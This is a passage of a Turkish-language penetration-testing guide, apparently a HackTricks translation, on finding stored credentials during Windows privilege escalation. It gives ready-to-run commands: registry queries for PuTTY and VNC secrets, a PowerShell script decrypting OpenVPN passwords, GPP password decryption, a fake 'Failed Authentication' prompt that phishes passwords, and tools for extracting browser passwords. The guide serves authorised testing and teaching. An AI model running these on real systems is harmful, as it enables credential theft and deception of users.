parolanın güncel olduğunu ve ayrıcalık yükseltme yolu olarak değerlendirmeden önce yerel Administrators grubu hesabına ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifreli bir veri bloğu bu koşullardan hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar malzemesini rutin numaralandırma çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Dizine veya Entra'ya dayalı depolaması ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; benzer şekilde, [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir servis kimlik bilgisi içeren yapılandırma veya bytecode barındırabilir. Arşivi yalnızca yetkili olduğunuzda inceleyin ve kurtarılan gizli bilgileri rutin numaralandırma çıktısına dahil etmeyin. Bir eklenti yolu tek başına gizli bir bilginin bulunduğunu kanıtlamaz; kurtarılan bir servis parolası yalnızca daha ayrıcalıklı bir hesap için de geçerliyse daha yüksek ayrıcalıklara ulaşmayı sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini birbirinden farklı gizli bilgilerle değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için de [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanı kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa, `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgeleri](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), parolaların düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş biçimde saklanabileceğini belirtir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisi yeniden kullanımını kanıtlar. Bu yolu envanter için bir ipucu olarak değerlendirin; veritabanı içeriğini ve kimlik bilgilerini rutin numaralandırma çıktısına dahil etmeyin.

Ayrı bir `Openfire\conf\openfire.xml` dosyası, harici veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış portlarını ve bağlandığı arayüzü açığa çıkarabilir. Openfire genellikle yönetici konsolunu loopback'e bağlar; dinleyici çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme ilkesini ve Openfire servis kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun servisin bağlamında çalışmasına neden olabilir; servis LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu, yönetici konsoluna erişimi ya da kod yürütmeyi tek başına kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` olarak adlandırılan Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı, sunucudaki kullanıcı rollerine, API erişilebilirliğine ve sunucunun ya da hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı malzemeler içerir; böyle bir yapılandırmanın bulunması sunucu CA'sına erişim olduğunu göstermez. Bazı dağıtımlar CA özel anahtarını çevrimdışı tutar; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı da bulunmayabilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; farklıysa servisin yapılandırılmış yolunu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Özel anahtarı günlüklerde veya numaralandırma çıktısında yazdırmaktan kaçının. Satıcının `config api_client` iş akışı, istemci sertifikası vermek için CA anahtarını kullanır; ancak etkin bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek, veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir erişim yolu sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması rehberine](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir; dışa aktarılmış bir oturum yedeği `sessions-backup.dat` olarak adlandırılabilir ve başka bir konumda saklanabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parolayla şifrelendiğini ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebileceğini belirtir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depoyu tanımlar. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH private key'ler `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle içinde ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı ssh anahtarları oluşturmayı, bunları `ssh-add` ile eklemeyi ve bir makineye ssh üzerinden giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Öncelikle yerel olarak erişilebilen yedekleme veya imaj dizinlerine bakın ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; tek başına `.wim` dosya adı, hive'ların açığa çıktığını kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma imajları sık karşılaşılan yanlış izlerdir. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajı kılavuzuna](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik vardı. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar), etki alanındaki tüm kullanıcılar tarafından erişilebilirdi. İkinci olarak, bu GPP'lerdeki parolalar, herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve kimliği doğrulanmış tüm kullanıcılar tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkındaki ayrıntıları içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec kullanarak parolaları elde etme:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Yapılandırması

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot'undaki yedek arşivleri

Yayımlanan bir webroot'a doğrudan yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir ifşa olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Arşivleri açmadan hızlıca yerel envanter oluşturup adları ve boyutları listeleyebilirsiniz:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya elde edilen bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini iste

Kullanıcının bunları bilebileceğini düşünüyorsanız, **kullanıcıdan kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini her zaman isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir zamanlar **düz metin** veya **Base64** biçiminde **parolalar** içerdiği bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş bir kasa adayı olarak değerlendirin; dosyanın varlığı, içeriğini okuyabileceğinizi, kilidini açabileceğinizi veya saklanan kimlik bilgilerini kullanabileceğinizi göstermez. Bu tür dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş bir kasaya işarettir. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm key-file veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) yöntemini değerlendirmeden önce belirtilen hesabı ve NT hash'in hedefin NTLM hizmeti tarafından hâlâ geçerli kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişiminin, hesap haklarının ve ayrıca gereken hizmet yürütme adımının da mevcut olması gerekir. Envanter raporunda kasa yolu ve okunabilirlik bilgileri yer almalı; veritabanının kendisi veya saklanan kimlik bilgileri yazdırılmamalıdır.

Önerilen dosyaların tümünü arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adlarında açıkça kimlik bilgilerinden söz edilen dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve geçerli kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle listenin boş olması kurtarılabilir bir yedeğin bulunmadığını kanıtlamaz. Bir arşiv adını, geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil, inceleme adayı olarak değerlendirin.

Erişilebilir ve silinmiş bir `.pfx` dosyası, **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası çalıştırma için geçerli kimliğin tam olarak ilgili betiği değiştirebilmesi, geçerli bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve bir zamanlanmış görevin ya da daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. Bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeleri ve zamanlanmış komutu inceleyin.

Ayrıca kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları inceleyin. Bir BitLocker kurtarma dışa aktarımı HTML veya TXT olarak, bazen de adlandırılmış bir yedek arşivinin içinde saklanabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifrelenmiş veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz olduğunda inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgisi kurtarma işlemi için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim tek başına kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin bulunduğunu kanıtlamaz.

Birkaç programın kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh keys çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca, bazı **parolalar** burada depolanmış olabileceğinden tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` dizinindedir; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeler](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); farklı bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca olası bir kimlik bilgisi deposuna işaret eder: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya izin verilen diğer key material'ı ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla,](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) bir profildeki `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeler. Bu dosyaların mevcut olması yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girişlerin bulunup bulunmadığını ve bir Primary Password'ın anahtarı koruyup korumadığını kontrol edin. Kurtarılan bir kimlik bilgisi domain hesabına aitse, bu hesabın etkin grup denetimi haklarını ve grubun [LAPS parolasını okuma veya şifresini çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı artifaktları tek başına bir administrator yolunun varlığını kanıtlamaz.

Tarayıcılardan parola çıkarmak için kullanılan araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sistemine yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla interface üzerinden işlevsellik sunar.

COM sınıfları ve interface'leri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur ve sonuç **HKEY\CLASSES\ROOT** olur.

Bu kayıt defterindeki CLSID'lerin içinde, bir **DLL'yi** gösteren **varsayılan değer** ile **ThreadingModel** adlı bir değer içeren alt kayıt defteri **InProcServer32** bulunabilir. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin içinde, bir DLL'yi gösteren varsayılan değer ile bir değer... içeren alt kayıt defteri InProcServer32 bulunabilir.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i persistence mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola araması**

**Dosya içeriğinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adına sahip dosyayı arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Kayıt defterinde anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, kurbanın içindeki kimlik bilgilerini arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parola içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri açık metin olarak kaydeden çeşitli araçların **sessions**'larını, **kullanıcı adlarını** ve **parolalarını** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Bir **SYSTEM olarak çalışan bir process'in full access ile yeni bir process açtığını** (`OpenProcess()`) düşünün. Aynı process, **main process'in tüm açık handle'larını devralan düşük privileges'lı yeni bir process de oluşturur** (`CreateProcess()`).\
Ardından, **düşük privileges'lı process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulmuş **privileged process'e ait açık handle'ı alabilir** ve **shellcode inject edebilirsiniz**.\
[Bu vulnerability'nin **nasıl tespit edilip exploit edileceği** hakkında daha fazla bilgi için bu örneği inceleyin.](leaked-handle-exploitation.md)\
